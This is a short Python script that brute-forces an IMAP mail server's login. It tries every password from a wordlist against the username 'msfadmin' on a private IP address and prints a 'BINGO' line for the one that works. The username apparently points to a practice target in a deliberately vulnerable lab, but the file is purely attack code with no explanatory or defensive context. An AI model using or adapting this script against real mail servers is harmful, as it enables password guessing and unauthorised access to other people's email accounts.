#!/usr/bin/python3.7
from imaplib import IMAP4
imapconn = IMAP4("10.171.1.129")

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
username="msfadmin"
wordlist="wordlist.txt"


with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            connection = imapconn.login(username,_password)
            print(ok + msg_ok + username + msg_pass + _password)
        
        except:
            print( fail + msg_fail + username + msg_pass + _password)
